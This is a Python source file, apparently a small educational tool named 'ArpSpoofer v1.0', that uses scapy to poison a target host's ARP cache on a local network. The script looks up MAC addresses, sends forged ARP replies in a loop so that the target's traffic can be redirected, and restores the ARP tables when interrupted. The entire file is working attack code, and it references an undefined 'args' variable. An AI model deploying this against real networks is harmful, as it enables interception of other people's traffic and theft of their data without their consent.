# Eyal Seckbach & Ynon Sivilia
# ArpSpoofer v1.0

# IMPORTS
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
from time import sleep

# -i wlo1 -s 10.7.15.254 -d 10 -gw -t 10.7.8.149

interface = None
target_ip = None
src = None
delay = None


def get_gateway():
    """
    It returns the gateway IP address of the interface
    :return: The gateway IP address.
    """
    return list(set([inter[2] for inter in conf.route.__dict__['routes'] if inter[3] == interface]) - {'0.0.0.0'})[0]


def get_mac(ip_addr):
    """
    It returns the MAC address of the IP address
    :param ip_addr: The IP address
    :return: The MAC address
    """
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_addr)
    response = srp1(packet, timeout=3, verbose=0)
    return response[ARP].hwsrc


def arp_spoof(dst, src, dst_mac):
    is_at_pkt = Ether(
        dst=dst_mac
    ) / ARP(
        op=2, psrc=src, pdst=dst, hwdst=dst_mac
    )
    sendp(is_at_pkt, verbose=0, iface=interface)


def arp_restore(dst_ip, src_ip, dst_mac, src_mac):
    packet = Ether(
        dst=dst_mac,
    ) / ARP(
        op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac
    )
    sendp(packet, count=2, verbose=0, iface=interface)


# MAIN
def main(interface_name, target, src_ip, d):
    global interface, target_ip, src, delay
    interface = interface_name
    target_ip = target
    src = src_ip
    delay = d

    target_mac = get_mac(target_ip)
    src_mac = get_mac(src)

    try:
        while True:
            print(f'Sending ARP spoof to {target_ip}...')
            arp_spoof(target_ip, src, target_mac)
            sleep(args.delay)  # wait

    except KeyboardInterrupt:
        print('Restoring ARP tables...')
        arp_restore(target_ip, src, target_mac, src_mac)
        arp_restore(src, target_ip, src_mac, target_mac)
